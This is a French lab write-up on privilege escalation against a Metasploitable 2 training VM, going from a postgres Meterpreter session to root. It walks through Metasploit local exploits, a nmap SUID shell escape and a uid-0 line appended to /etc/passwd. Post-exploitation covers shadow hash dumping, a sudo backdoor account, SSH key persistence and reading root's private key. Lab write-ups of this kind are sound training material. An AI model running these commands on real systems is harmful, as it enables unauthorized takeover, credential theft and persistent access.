# Module #9 — Privilege Escalation : de postgres à root

## Informations

| Champ | Valeur |
|---|---|
| Date | 2026-05-13 |
| Cible | Metasploitable 2 (192.168.100.2) |
| Attaquant | Kali Linux (192.168.100.3) |
| Point de départ | Session Meterpreter en tant que `postgres` |
| Objectif | Obtenir un shell `root` |

## Qu'est-ce que le Privilege Escalation ?

Après un exploit, on a souvent un accès bas niveau (utilisateur du service
vulnérable). Le privilege escalation (privesc) consiste à abuser d'une
faille locale pour passer `root`.

```
Exploit initial          Privilege Escalation
      |                          |
postgres (uid=108)   →    root (uid=0)
      |                          |
accès limité              accès total système
```

## Pourquoi postgres n'est pas suffisant ?

```bash
getuid          # postgres
# Ne peut pas :
# - lire /etc/shadow
# - modifier des fichiers système
# - installer des backdoors persistantes
# - accéder aux fichiers des autres utilisateurs
```

---

## Méthode 1 — local_exploit_suggester (automatique)

### Étape 1 : Identifier les vulnérabilités locales

Depuis la session Meterpreter :

```bash
run post/multi/recon/local_exploit_suggester
```

Résultat typique sur Metasploitable 2 (kernel 2.6.24) :

```
[*] Running checks on session 1...
[+] exploit/linux/local/udev_netlink - appears to be vulnerable
[+] exploit/linux/local/sock_sendpage - appears to be vulnerable
[+] exploit/linux/local/sendfile64 - appears to be vulnerable
```

### Étape 2 : Backgrounder la session

```bash
background
```

### Étape 3 : Utiliser un exploit local

```bash
use exploit/linux/local/sock_sendpage
set SESSION 1
set LHOST 192.168.100.3
run
```

Résultat attendu :

```
meterpreter > getuid
Server username: root
```

---

## Méthode 2 — Exploitation manuelle via shell

### Vérifier le kernel

```bash
shell
uname -a
```

```
Linux metasploitable 2.6.24-16-server #1 SMP ...
```

Kernel 2.6.24 = très vieux = beaucoup de CVE locaux disponibles.

### Vérifier sudo

```bash
sudo -l
```

Si un binaire est autorisé sans mot de passe → on peut l'exploiter.

### Chercher les binaires SUID

```bash
find / -perm -4000 -type f 2>/dev/null
```

Les binaires SUID s'exécutent avec les droits de leur propriétaire (souvent root).
Si l'un d'eux est vulnérable → escalade possible.

Résultat typique :

```
/usr/bin/passwd
/usr/bin/sudo
/bin/ping
/usr/bin/nmap        ← nmap en SUID = privesc classique
...
```

### nmap SUID → root

Si `nmap` est en SUID :

```bash
nmap --interactive
nmap> !sh
# whoami
root
```

---

## Méthode 3 — /etc/passwd writable

Si `/etc/passwd` est accessible en écriture (misconfiguration) :

```bash
ls -la /etc/passwd
```

Si writable :

```bash
# Générer un hash pour un nouveau user root
openssl passwd -1 hacker123
# Résultat : $1$abc...

# Ajouter l'utilisateur
echo 'hacker:$1$abc...:0:0:root:/root:/bin/bash' >> /etc/passwd

# Se connecter
su hacker
# Password: hacker123
# whoami → root
```

---

## Méthode 4 — getsystem (Windows / Meterpreter)

```bash
getsystem
```

> Sur Linux, `getsystem` fonctionne rarement. C'est principalement une
> commande Windows. Sur Metasploitable, utiliser les méthodes 1 ou 2.

---

## Vérification : confirmer root

```bash
getuid
```

```
Server username: root
```

```bash
shell
whoami
id
cat /etc/shadow    # accessible uniquement en root
```

---

## Post-exploitation en root

Une fois root, les actions possibles :

### Hashdump complet

```bash
run post/linux/gather/hashdump
```

Récupère tous les hashes `/etc/shadow` — crackables avec John.

### Créer un utilisateur persistant

```bash
shell
useradd -m -s /bin/bash backdoor
echo "backdoor:password123" | chpasswd
usermod -aG sudo backdoor
```

### Ajouter une clé SSH

```bash
run post/linux/manage/sshkey_persistence
```

Permet de revenir via SSH sans relancer l'exploit.

### Lire des fichiers sensibles

```bash
cat /etc/shadow
cat /root/.bash_history
cat /root/.ssh/id_rsa
```

---

## Récapitulatif des techniques

| Technique | Outil | Condition |
|---|---|---|
| Exploit kernel local | `local_exploit_suggester` | Kernel vieux |
| nmap SUID | shell manuel | nmap SUID présent |
| /etc/passwd writable | shell manuel | Mauvaises permissions |
| sudo mal configuré | `sudo -l` | Config permissive |
| getsystem | Meterpreter | Windows surtout |

---

## Chaîne d'attaque complète

```
Exploit PostgreSQL (exploit #3)
        ↓
Session Meterpreter (postgres)
        ↓
local_exploit_suggester
        ↓
exploit/linux/local/sock_sendpage (SESSION=1)
        ↓
Session Meterpreter (ROOT)
        ↓
hashdump + persistence
```

---

## Leçons apprises

- Un exploit initial donne rarement root directement — la privesc est une étape à part entière
- `local_exploit_suggester` est le point de départ systématique
- Un kernel vieux est une menace critique — toujours patcher
- Les binaires SUID doivent être audités régulièrement
- Une fois root, la machine est totalement compromise

## Références

- https://www.rapid7.com/db/modules/exploit/linux/local/sock_sendpage/
- https://www.rapid7.com/db/modules/post/multi/recon/local_exploit_suggester/
- https://gtfobins.github.io/ (binaires exploitables SUID/sudo)
- https://nvd.nist.gov/vuln/detail/CVE-2009-2692
